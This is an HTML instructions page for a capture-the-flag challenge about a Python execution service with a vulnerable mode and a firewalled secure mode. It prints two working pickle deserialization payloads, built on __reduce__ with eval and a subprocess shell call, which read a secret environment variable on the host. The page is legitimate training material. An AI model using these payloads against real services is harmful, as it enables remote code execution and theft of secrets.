<!DOCTYPE html>
<html>
<head>
    <title>Modal CTF Challenge</title>
    <style>
        body { font-family: monospace; max-width: 1000px; margin: 50px auto; padding: 20px; }
        h1 { color: #333; }
        .code-block { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre; }
        .section { margin: 30px 0; }
        .warning { color: #d9534f; font-weight: bold; }
        .secure-mode { background: #d4edda; border: 2px solid #c3e6cb; padding: 15px; border-radius: 5px; }
        .vulnerable-mode { background: #f8d7da; border: 2px solid #f5c6cb; padding: 15px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>ðŸš© Modal CTF Challenge - Capture the Flag! ðŸš©</h1>
    
    <div class="section">
        <h2>Challenge Description</h2>
        <p>Your goal is to capture the flag (stored in the FLAG environment variable on this VM).</p>
        <p>This server accepts Python code, sends it to a Modal Restricted Function for execution, and then processes the result.</p>
        <p>The server can run in two modes:</p>
        <ul>
            <li><strong>VULNERABLE Mode:</strong> Pickle deserialization attacks work (standard CTF challenge)</li>
            <li><strong>SECURE Mode:</strong> rfmodal's pickle firewall blocks standard attacks (find another way!)</li>
        </ul>
    </div>

    <div class="section">
        <h2>Check Server Mode</h2>
        <p>First, check which mode the server is running in:</p>
        <div class="code-block">curl [YOUR_URL]/mode</div>
        <p>This will tell you if pickle attacks will work or if you need to find another approach.</p>
    </div>

    <div class="section">
        <h2>Example: Simple Code Execution</h2>
        <p>Try running simple Python code to verify it's executing remotely in Modal:</p>
        <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
# Outputs gvisor when running in the sandbox
import os
f"MODAL_FUNCTION_RUNTIME: {os.environ.get('MODAL_FUNCTION_RUNTIME', 'not set')}"
EOF</div>
    </div>

    <div class="section vulnerable-mode">
        <h2>ðŸ”“ Vulnerable Mode: Pickle Deserialization Attack</h2>
        <p>If the server is in VULNERABLE mode, these exploits will capture the flag:</p>
        <p><strong>Example 1:</strong></p>
        <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
class FlagExploit:
    def __reduce__(self):
        import os
        return (eval, ("f\"The flag is: {__import__('os').environ.get('FLAG', 'No flag')}\"",))

FlagExploit()
EOF</div>
        <p><strong>Example 2:</strong></p>
        <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n \"The flag is: $FLAG\"']).decode()",))})()
EOF</div>
        <p>The server will return pretty-printed JSON with the flag in the "result" field.</p>
    </div>

    <div class="section secure-mode">
        <h2>ðŸ”’ Secure Mode: Advanced Challenge</h2>
        <p>If the server is in SECURE mode, the pickle attacks above will be blocked by rfmodal's firewall.</p>
        <p>You'll see an error like:</p>
        <div class="code-block">{
  "success": false,
  "error": "Failed to execute code: [firewall blocked]",
  "mode": "secure",
  "firewall_blocked": true,
  "hint": "The pickle firewall blocked your attack. This is expected in secure mode!"
}</div>
        <p><strong>Your challenge:</strong> Find another way to exploit the system... if one exists!</p>
        <p>Hint: The rfmodal firewall is designed to be secure. There might not be a bypass. That's the real challenge!</p>
    </div>

    <div class="section">
        <h2>Rules</h2>
        <ul>
            <li>The flag is stored in the FLAG environment variable on the host VM</li>
            <li>The Modal function runs with restrict_modal_access=True and block_network=True</li>
            <li>Code executes in a Modal container, results are processed on the host</li>
            <li>In SECURE mode, standard pickle exploits are blocked - be creative!</li>
        </ul>
    </div>

    <div class="section">
        <h2>API Endpoints</h2>
        <p><strong>POST /execute</strong> - Execute Python code</p>
        <ul>
            <li>Request body: Raw Python code (plain text, not JSON)</li>
            <li>Response: Pretty-printed JSON with execution results</li>
            <li>Use <code>--data-binary</code> to preserve newlines in multiline code</li>
        </ul>
        <p><strong>GET /mode</strong> - Check security mode</p>
        <ul>
            <li>Returns current mode (secure/vulnerable) and firewall status</li>
        </ul>
        <p><strong>GET /health</strong> - Health check</p>
        <ul>
            <li>Returns server status and configuration details</li>
        </ul>
        <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary 'print("Hello")'
curl [YOUR_URL]/mode
curl [YOUR_URL]/health</div>
    </div>
</body>
</html>
